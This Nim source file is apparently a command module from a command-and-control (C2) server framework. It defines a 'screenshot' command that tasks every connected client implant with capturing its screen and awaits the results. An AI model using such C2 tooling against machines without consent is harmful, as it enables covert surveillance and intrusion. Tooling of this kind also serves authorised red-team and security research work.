import std/[
  asyncdispatch, 
  strutils, 
  tables
]

import ../../types, ../../communication

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  for client in server.cli.handlingClient:
    let task = await client.sendClientTask("screenshot")
    if not task.isNil(): await task.awaitResponse()

let cmd*: Command = Command(
  execProc: execProc,
  name: "screenshot",
  argsLength: 0,
  usage: @["screenshot"],
  cliMode: @[ClientInteractMode],
  description: "screenshot",
  category: CCClientInteraction,
  requiresConnectedClient: true
)